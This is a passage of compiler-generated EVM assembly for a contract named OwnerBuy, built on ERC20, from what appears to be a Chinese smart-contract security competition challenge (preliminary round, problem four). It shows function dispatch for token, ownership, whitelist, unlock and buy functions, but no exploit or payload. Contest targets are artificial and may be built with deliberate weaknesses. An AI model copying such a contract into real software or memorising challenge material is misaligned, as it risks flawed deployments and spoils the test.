\"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_37:\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":670:753  function name() public view returns (string memory) {\r... */\n      pop\n      tag_38\n      tag_39\n      jump\t// in\n    tag_38:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_40:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_42\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_40)\n    tag_42:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":670:753  function name() public view returns (string memory) {\r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_43\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_43:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2536:2684  function approve(address spender, uint256 value) public returns (bool) {\r... */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_44\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_44:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2536:2684  function approve(address spender, uint256 value) public returns (bool) {\r... */\n      pop\n      tag_45\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_46\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_46:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":2536:2684  function approve(address spender, uint256 value) public returns (bool) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_47\n      jump\t// in\n    tag_45:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1559:1650  function totalSupply() public view returns (uint256) {\r... */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_48\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_48:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1559:1650  function totalSupply() public view returns (uint256) {\r... */\n      pop\n      tag_49\n      tag_50\n      jump\t// in\n    tag_49:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2612:2652  mapping(address => uint256) public Times */\n    tag_5:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_51\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_51:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2612:2652  mapping(address => uint256) public Times */\n      pop\n      tag_52\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_53\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_53:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2612:2652  mapping(address => uint256) public Times */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_54\n      jump\t// in\n    tag_52:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3155:3411  function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r... */\n    tag_6:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_55\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_55:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3155:3411  function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r... */\n      pop\n      tag_56\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x60\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_57\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_57:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3155:3411  function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_58\n      jump\t// in\n    tag_56:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":1522:1605  function decimals() public view returns (uint8) {\r... */\n    tag_7:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_59\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_59:\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":1522:1605  function decimals() public view returns (uint8) {\r... */\n      pop\n      tag_60\n      tag_61\n      jump\t// in\n    tag_60:\n      mload(0x40)\n      dup1\n      dup3\n      0xff\n      and\n      0xff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3820:4026  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r... */\n    tag_8:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_62\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_62:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3820:4026  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r... */\n      pop\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_64\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_64:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":3820:4026  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_65\n      jump\t// in\n    tag_63:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3075:3207  function unsetWhite(address addr) external onlyOwner returns (bool) {\r... */\n    tag_9:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_66\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_66:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3075:3207  function unsetWhite(address addr) external onlyOwner returns (bool) {\r... */\n      pop\n      tag_67\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_68\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_68:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3075:3207  function unsetWhite(address addr) external onlyOwner returns (bool) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_69\n      jump\t// in\n    tag_67:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3640:3842  function changestatus(address _owner) public {\r... */\n    tag_10:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_70\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_70:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3640:3842  function changestatus(address _owner) public {\r... */\n      pop\n      tag_71\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_72\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_72:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3640:3842  function changestatus(address _owner) public {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_73\n      jump\t// in\n    tag_71:\n      stop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3850:4115  function changeOwner() public {\r... */\n    tag_11:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_74\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_74:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3850:4115  function changeOwner() public {\r... */\n      pop\n      tag_75\n      tag_76\n      jump\t// in\n    tag_75:\n      stop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2567:2605  mapping(address => bool) public status */\n    tag_12:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_77\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_77:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2567:2605  mapping(address => bool) public status */\n      pop\n      tag_78\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_79\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_79:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2567:2605  mapping(address => bool) public status */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_80\n      jump\t// in\n    tag_78:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":311:340  address public _previousOwner */\n    tag_13:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_81\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_81:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":311:340  address public _previousOwner */\n      pop\n      tag_82\n      tag_83\n      jump\t// in\n    tag_82:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1713:1823  function balanceOf(address account) public view returns (uint256) {\r... */\n    tag_14:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_84\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_84:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1713:1823  function balanceOf(address account) public view returns (uint256) {\r... */\n      pop\n      tag_85\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_86\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_86:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":1713:1823  function balanceOf(address account) public view returns (uint256) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_87\n      jump\t// in\n    tag_85:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1446:1586  function renounceOwnership() public onlyOwner {\r... */\n    tag_15:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_88\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_88:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":1446:1586  function renounceOwnership() public onlyOwner {\r... */\n      pop\n      tag_89\n      tag_90\n      jump\t// in\n    tag_89:\n      stop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":806:885  function owner() public view returns (address) {\r... */\n    tag_16:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_91\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_91:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":806:885  function owner() public view returns (address) {\r... */\n      pop\n      tag_92\n      tag_93\n      jump\t// in\n    tag_92:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":872:959  function symbol() public view returns (string memory) {\r... */\n    tag_17:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_94\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_94:\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":872:959  function symbol() public view returns (string memory) {\r... */\n      pop\n      tag_95\n      tag_96\n      jump\t// in\n    tag_95:\n      mload(0x40)\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n        /* \"--CODEGEN--\":23:24   */\n      0x00\n        /* \"--CODEGEN--\":8:108   */\n    tag_97:\n        /* \"--CODEGEN--\":33:36   */\n      dup4\n        /* \"--CODEGEN--\":30:31   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      lt\n        /* \"--CODEGEN--\":8:108   */\n      iszero\n      tag_99\n      jumpi\n        /* \"--CODEGEN--\":99:100   */\n      dup1\n        /* \"--CODEGEN--\":94:97   */\n      dup3\n        /* \"--CODEGEN--\":90:101   */\n      add\n        /* \"--CODEGEN--\":84:102   */\n      mload\n        /* \"--CODEGEN--\":80:81   */\n      dup2\n        /* \"--CODEGEN--\":75:78   */\n      dup5\n        /* \"--CODEGEN--\":71:82   */\n      add\n        /* \"--CODEGEN--\":64:103   */\n      mstore\n        /* \"--CODEGEN--\":52:54   */\n      0x20\n        /* \"--CODEGEN--\":49:50   */\n      dup2\n        /* \"--CODEGEN--\":45:55   */\n      add\n        /* \"--CODEGEN--\":40:55   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":8:108   */\n      jump(tag_97)\n    tag_99:\n        /* \"--CODEGEN--\":12:26   */\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20Detailed.sol\":872:959  function symbol() public view returns (string memory) {\r... */\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_100\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_100:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2831:2930  function isWhite(address addr) public view returns (bool) {\r... */\n    tag_18:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_101\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_101:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2831:2930  function isWhite(address addr) public view returns (bool) {\r... */\n      pop\n      tag_102\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_103\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_103:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2831:2930  function isWhite(address addr) public view returns (bool) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_104\n      jump\t// in\n    tag_102:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4529:4745  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r... */\n    tag_19:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_105\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_105:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4529:4745  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r... */\n      pop\n      tag_106\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_107\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_107:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":4529:4745  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_108\n      jump\t// in\n    tag_106:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":2325:2502  function unlock() external payable {\r... */\n    tag_20:\n      tag_109\n      tag_110\n      jump\t// in\n    tag_109:\n      stop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":4123:4517  function buy() public payable returns (bool success) {\r... */\n    tag_21:\n      tag_111\n      tag_112\n      jump\t// in\n    tag_111:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* 